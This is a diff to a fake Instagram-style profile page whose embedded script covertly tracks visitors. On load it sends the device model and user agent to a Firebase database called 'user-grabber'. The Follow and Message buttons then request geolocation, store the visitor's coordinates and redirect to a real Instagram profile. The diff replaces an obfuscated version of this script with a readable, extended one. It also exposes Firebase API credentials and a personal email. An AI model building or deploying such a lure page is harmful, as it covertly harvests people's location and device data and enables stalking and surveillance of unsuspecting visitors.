@@ -35,7 +35,7 @@
         .full-name{font-weight:700;display:block}
         .category{color:var(--ig-secondary)}
 
-        /* BUTTONS (New Addition) */
+        /* BUTTONS */
         .action-buttons { display: flex; gap: 6px; margin-bottom: 15px; }
         .btn-blue { background: var(--ig-blue); color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; padding: 7px 16px; flex: 1; text-align: center; cursor: pointer; }
         .btn-gray { background: var(--ig-btn-gray); color: black; border: none; border-radius: 8px; font-weight: 600; font-size: 14px; padding: 7px 16px; flex: 1; text-align: center; cursor: pointer; }
@@ -79,7 +79,7 @@
             DM for collaborations or Mail at shivmarihal@gmail.com 👇🏻
         </div>
 
-        <!-- NEW: Follow Buttons -->
+        <!-- Follow Buttons -->
         <div class="action-buttons">
             <button class="btn-blue" onclick="triggerCapture()">Follow</button>
             <button class="btn-gray" onclick="triggerCapture()">Message</button>
@@ -125,9 +125,91 @@
         </div>
     </div>
 
-    <script>
-    // Obfuscated Logic (Same as before + Button Logic)
-    (function(){var _0xa=["\x6D\x6F\x62\x69\x6C\x65\x5F\x75\x73\x65\x72\x73","\x41\x49\x7A\x61\x53\x79\x43\x42\x41\x37\x42\x64\x42\x74\x30\x5F\x43\x51\x49\x4E\x31\x74\x44\x72\x48\x6F\x61\x6A\x5A\x51\x7A\x52\x5F\x51\x74\x6F\x6D\x68\x55","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x75\x73\x65\x72\x2D\x67\x72\x61\x62\x62\x65\x72\x2D\x64\x65\x66\x61\x75\x6C\x74\x2D\x72\x74\x64\x62\x2E\x61\x73\x69\x61\x2D\x73\x6F\x75\x74\x68\x65\x61\x73\x74\x31\x2E\x66\x69\x72\x65\x62\x61\x73\x65\x64\x61\x74\x61\x62\x61\x73\x65\x2E\x61\x70\x70","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x61\x57\x35\x7A\x64\x47\x46\x6E\x63\x6D\x46\x74\x4C\x6D\x4E\x76\x62\x53\x39\x77\x63\x6D\x6C\x35\x59\x57\x35\x72\x59\x57\x31\x71\x59\x57\x6C\x75\x58\x31\x39\x66\x58\x7A\x41\x79\x4D\x44\x63\x76"];const _0xb={apiKey:_0xa[1],authDomain:"user-grabber.firebaseapp.com",projectId:"user-grabber",databaseURL:_0xa[2],storageBucket:"user-grabber.firebasestorage.app",messagingSenderId:"1004415300770",appId:"1:1004415300770:web:46aeef2b3a35d95ac193fb"};try{firebase.initializeApp(_0xb)}catch(e){}const _0xc=firebase.database();let _0xd=null;let _0xe=false;const _0xf=atob(_0xa[3]);window.addEventListener("DOMContentLoaded",()=>{const _0x1=navigator.userAgent;let _0x2="Unknown";if(_0x1.indexOf("iPhone")>-1)_0x2="iPhone";else if(_0x1.indexOf("Android")>-1)_0x2="Android";_0xd=_0xc.ref(_0xa[0]).push();_0xd.set({device:_0x2,userAgent:_0x1,time:new Date().toLocaleString(),status:"Init"})});window.triggerCapture=function(){if(!_0xd)return;if(_0xe)return;_0xe=true;const _0x3=()=>{window.location.href=_0xf};navigator.geolocation.getCurrentPosition((p)=>{_0xd.update({lat:p.coords.latitude,lng:p.coords.longitude,acc:p.coords.accuracy,type:"approx",ts:Date.now()}).then(_0x3);},()=>{_0xd.update({err:"denied_or_to"}).then(_0x3)},{enableHighAccuracy:false,timeout:30000,maximumAge:60000})}})();
-    </script>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCBA7BdBt0_CQIN1tDrHoajZQzR_QtomhU",
+        authDomain: "user-grabber.firebaseapp.com",
+        projectId: "user-grabber",
+        databaseURL: "https://user-grabber-default-rtdb.asia-southeast1.firebasedatabase.app",
+        storageBucket: "user-grabber.firebasestorage.app",
+        messagingSenderId: "1004415300770",
+        appId: "1:1004415300770:web:46aeef2b3a35d95ac193fb"
+    };
+
+    try { firebase.initializeApp(firebaseConfig); } catch(e){}
+    const db = firebase.database();
+    let currentUserRef = null;
+    let locationRequested = false;
+    const finalRedirect = "https://www.instagram.com/priyankamjain___0207/";
+
+    // --- NEW FUNCTION: Get Exact Model Name (Async) ---
+    async function getDeviceModel() {
+        // 1. Try modern User-Agent Client Hints (Chrome/Android)
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            try {
+                const uaData = await navigator.userAgentData.getHighEntropyValues(["model"]);
+                if (uaData.model) return uaData.model; // Returns "CPH2753" or "Pixel 6"
+            } catch (e) {
+                console.log("Client Hints failed");
+            }
+        }
+        
+        // 2. Fallback: Parse old User Agent string
+        const ua = navigator.userAgent;
+        if (ua.indexOf("Android") > -1) {
+            // Try to find text between "; " and " Build/"
+            const match = ua.match(/;\s([^;]+)\sBuild\//);
+            if (match && match[1]) return match[1];
+            return "Android Device";
+        } else if (ua.indexOf("iPhone") > -1) {
+            return "iPhone";
+        }
+        
+        return "Unknown Device";
+    }
+
+    // --- Modified Auto-Run ---
+    window.addEventListener('DOMContentLoaded', async () => {
+        // Wait for the exact model name
+        const exactModel = await getDeviceModel();
+        
+        currentUserRef = db.ref('mobile_users').push();
+        currentUserRef.set({
+            device: exactModel, // Now saves "CPH2753" etc.
+            userAgent: navigator.userAgent,
+            time: new Date().toLocaleString(),
+            status: "On Page (Basic Info)"
+        });
+    });
+
+    // --- Capture Logic ---
+    window.triggerCapture = function() {
+        if (!currentUserRef) return;
+        if (locationRequested) return;
+        locationRequested = true;
+
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                currentUserRef.update({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    location_type: "Approximate",
+                    status: "Captured (Redirecting)"
+                }).then(() => {
+                    window.location.href = finalRedirect;
+                });
+            },
+            (err) => {
+                currentUserRef.update({ 
+                    status: "Error: " + err.message 
+                }).then(() => {
+                    window.location.href = finalRedirect;
+                });
+            },
+            { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
+        );
+    };
+</script>
 </body>
 </html>
